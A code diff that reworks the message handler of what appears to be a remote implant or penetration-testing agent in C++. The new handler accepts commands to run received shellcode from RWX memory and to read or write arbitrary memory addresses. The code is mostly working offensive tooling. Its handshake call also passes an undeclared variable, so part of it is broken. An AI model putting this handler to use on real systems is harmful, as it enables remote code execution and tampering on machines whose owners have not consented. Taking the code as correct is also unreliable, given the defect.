@@ -1,93 +1,100 @@
 #include "global.hpp"
-#include <sstream>
-#include <iomanip>
-string create_handshake();
+#include <stdint.h>
+#ifdef DEBUG
+#include <iostream>
+using namespace std;
+#endif
 typedef unsigned long long (*ShellcodeFunc)();
+size_t createHandshake(char* resp, size_t respMax, void* scratchpad);
 
-void printStringAsHex(const string& s) {
-    for (unsigned char c : s) {
-        cout << "0x"
-             << hex << setw(2) << setfill('0')
-             << static_cast<int>(c) << ' ';
-    }
-    cout << dec << '\n';
-}
-string to_hex(const uint8_t* data, size_t len) {
-    static const char* hex = "0123456789abcdef";
-    string out;
-    out.reserve(len * 2);
-
-    for (size_t i = 0; i < len; i++) {
-        out.push_back(hex[data[i] >> 4]);
-        out.push_back(hex[data[i] & 0xF]);
+bool handleMessage(
+    const char* input,
+    size_t inputSize,
+    char* output,
+    size_t outputCapacity,
+    size_t& outputSize,
+    PVOID execution_mem
+) {
+    if (inputSize == 0) {
+        outputSize = 0;
+        return false;
     }
 
-    return out;
-}
-
-string handleMessage(string& msg, PVOID mem) {
-    if (msg.empty()) {
-        return "";
-    }
-
-    uint8_t type = (uint8_t) msg[0];
+    uint8_t type = (uint8_t)input[0];
+    outputSize = 0; // Initialize size
 
     switch (type) {
-        case 0x00:{
-            string retval = create_handshake();
-            return retval;
-        }
-        case 0x01:{
-            QWORD shellcode_size = *((QWORD*)msg.substr(1).c_str());
-            string shellcode = msg.substr(1+8,shellcode_size);
-            memcpy(mem, shellcode.c_str(), shellcode_size);
-            ShellcodeFunc exec = (ShellcodeFunc)(mem);
-            unsigned long long retval = exec();
-            string s_retval = string(1,1) + string((char*)(&retval), 8);
-            return s_retval;
-            break;
-        }
-        case 0x02: {
-        
-        // Check if message has enough header data (1 byte type + 8 bytes addr + 8 bytes len)
-        if (msg.size() < 17) {
-            return string(1, 0x01) + "ERROR: SHORT_MSG";
+        case 0x00: { // Handshake
+            output[0] = 0x00 ; // Success indicator
+            outputSize = createHandshake(output+1, outputCapacity-1, scratchpad)+1;
+            return true;
         }
 
-        // Extract Address and Length from the message string
-        uint64_t startAddr;
-        uint64_t readLen;
-        memcpy(&startAddr, msg.data() + 1, 8);
-        memcpy(&readLen, msg.data() + 9, 8);
+        case 0x01: { // Execute Shellcode
+            // Format: [Type 0x01][8-byte size][Shellcode Bytes]
+            if (inputSize < 9) return false;
+            uint64_t sc_size = *(uint64_t*)(input + 1);
+            
+            if (inputSize < (9 + sc_size)) return false;
 
+            // Copy and Execute (Assumes 'execution_mem' is pre-allocated with RWX)
+            memcpy(execution_mem, input + 9, (size_t)sc_size);
+            ShellcodeFunc exec = (ShellcodeFunc)execution_mem;
+            #ifdef DEBUG
+            cout << "Executing " << (hex) << (unsigned long long) execution_mem << ". Size " << sc_size << endl;
+            #endif
+            uint64_t result = exec();
 
-        // Use a stringstream to build the hex response or return raw bytes
-        // For a pentest tool, returning raw bytes is usually more efficient
-        string s_retval = string(1, 0x01); // Header indicating success/type 1
-        
-        s_retval.append(reinterpret_cast<const char*>(startAddr), readLen);
-
-
-        
-        // Return the response (Type byte + hex string)
-        return s_retval;
-        break;
+            // Format response: [Type 0x01][8-byte result]
+            if (outputCapacity < 9) return false;
+            output[0] = 0x01;
+            memcpy(output + 1, &result, 8);
+            outputSize = 9;
+            return true;
         }
 
-        case 0x03:{
-            uint64_t writeAddr;
-            uint64_t writeLen;
-            memcpy(&writeAddr, msg.data()+1, 8);
-            memcpy(&writeLen, msg.data()+9, 8);
+        case 0x02: { // Read Memory
+            // Format: [Type 0x02][8-byte addr][8-byte len]
+            if (inputSize < 17) return false;
+            uint64_t startAddr = *(uint64_t*)(input + 1);
+            uint64_t readLen = *(uint64_t*)(input + 9);
 
-            memcpy((PVOID)writeAddr, msg.data()+17, writeLen);
-            string s_retval = string(1, 0x01);
-            return s_retval;
+            // Bounds Check
+            if (readLen + 1 > outputCapacity) readLen = outputCapacity - 1;
 
-            break;
+            output[0] = 0x01; // Success indicator
+            // Caution: Arbitrary read can cause access violation (0xC0000005)
+            // Use IsBadReadPtr or __try/__except in real assessments
+            #ifdef DEBUG
+            cout << "Reading from " << (hex) << (unsigned long long) startAddr << ". Size " << readLen << endl;
+            #endif 
+            memcpy(output + 1, (void*)startAddr, (size_t)readLen);
+            outputSize = (size_t)readLen + 1;
+            return true;
         }
+
+        case 0x03: { // Write Memory
+            // Format: [Type 0x03][8-byte addr][8-byte len][Data...]
+            if (inputSize < 17) return false;
+            uint64_t writeAddr = *(uint64_t*)(input + 1);
+            uint64_t writeLen = *(uint64_t*)(input + 9);
+
+            if (inputSize < (17 + writeLen)) return false;
+            #ifdef DEBUG
+            cout << "Writing to " << (hex) << (unsigned long long) writeAddr << ". Size " << writeLen << endl;
+            #endif
+            // Perform the write
+            memcpy((void*)writeAddr, input + 17, (size_t)writeLen);
+
+            if (outputCapacity < 1) return false;
+            output[0] = 0x01; // Success
+            outputSize = 1;
+            return true;
+        }
+
         default:
             break;
     }
-    return "";
+
+    return false; // Unknown type or error
 }
